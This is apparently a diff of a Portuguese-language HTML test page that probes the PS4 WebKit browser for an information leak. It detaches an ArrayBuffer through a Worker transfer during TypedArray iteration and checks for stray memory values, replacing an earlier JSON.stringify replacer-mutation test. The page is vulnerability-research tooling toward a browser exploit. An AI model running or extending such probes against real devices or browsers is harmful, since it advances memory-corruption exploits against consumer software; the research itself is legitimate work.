@@ -1,60 +1,76 @@
 <!DOCTYPE html>
+
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<title>PS4 WebKit – JSON.stringify Replacer Mutation Test</title>
-
+<meta charset="UTF-8">
+<title>PS4 WebKit – Info Leak Candidate Test</title>
+<style>
+body { background:#000; color:#0f0; font-family:monospace; padding:20px; }
+button { width:100%; padding:15px; margin-bottom:10px; font-size:16px; }
+#log { border:1px solid #333; padding:10px; height:300px; overflow:auto; }
+.leak { color:#ff0; font-weight:bold; }
+.safe { color:#888; }
+</style>
 </head>
 <body>
 
-<h1>JSON.stringify – Replacer Mutation (Isolated)</h1>
-<p>Objetivo: verificar comportamento inconsistente quando o <code>replacer</code> (array) é mutado via <code>Proxy</code> durante a serialização.</p>
+<h2>TypedArray Iterator + Detach (Info Leak Probe)</h2>
+<p>Objetivo: detectar leitura inconsistente após detach de ArrayBuffer durante iteração nativa.</p>
 
-<button onclick="runTest()">Executar teste</button>
-<div id="log">Aguardando execução…</div>
+<button onclick="runTest()">Executar Teste</button>
+
+<div id="log"></div>
 
 <script>
-  const LOG = document.getElementById('log');
-  function log(msg, cls='ok') {
-    const d = document.createElement('div');
-    d.className = cls;
-    d.textContent = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
-    LOG.appendChild(d);
-    LOG.scrollTop = LOG.scrollHeight;
-  }
+const logDiv = document.getElementById('log');
+function log(msg, cls='safe') {
+  const d = document.createElement('div');
+  d.textContent = msg;
+  d.className = cls;
+  logDiv.appendChild(d);
+  logDiv.scrollTop = logDiv.scrollHeight;
+}
 
-  function runTest() {
-    LOG.textContent = '';
-    log('Iniciando JSON.stringify com replacer mutável…');
+function runTest() {
+  log('Iniciando teste...');
 
-    const target = { a: 1, b: 2, c: 3 };
-    const replacer = [0, 1, 2];
+  const ab = new ArrayBuffer(0x1000);
+  const ta = new Uint32Array(ab);
+  for (let i = 0; i < ta.length; i++) ta[i] = 0x41414141;
 
-    // Proxy intercepta leitura dos índices do replacer
-    const p = new Proxy(replacer, {
-      get(t, k) {
-        if (k === '1') {
-          // Mutação estrutural DURANTE a serialização
-          t.length = 0;
+  const workerCode = `onmessage = e => postMessage('ok', [e.data]);`;
+  const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
+
+  const iter = {
+    [Symbol.iterator]() {
+      let i = 0;
+      return {
+        next() {
+          if (i === 8) {
+            // Detach real do buffer
+            worker.postMessage(ab, [ab]);
+          }
+          if (i >= ta.length) return { done:true };
+          return { value: ta[i++], done:false };
         }
-        return Reflect.get(t, k);
-      }
-    });
-
-    try {
-      const json = JSON.stringify(target, p);
-      log('Resultado JSON: ' + json);
-
-      // Detecção de anomalia semântica (não é OOB / não é info leak)
-      if (json.includes('undefined') || json.length < 5) {
-        log('Anomalia de comportamento detectada (inconsistência de serialização).', 'bad');
-      } else {
-        log('Comportamento consistente com a especificação.', 'warn');
-      }
-    } catch (e) {
-      log('Exceção lançada: ' + e.message, 'warn');
+      };
     }
+  };
+
+  try {
+    const res = new Uint32Array(iter);
+    for (let i = 0; i < res.length; i++) {
+      const v = res[i];
+      if (v !== 0x41414141 && v !== 0) {
+        log(`LEAK POTENCIAL: index ${i} => 0x${v.toString(16)}`, 'leak');
+        return;
+      }
+    }
+    log('Nenhum vazamento observado (comportamento seguro).');
+  } catch (e) {
+    log('Exceção capturada: ' + e.message);
   }
+}
 </script>
 
 </body>
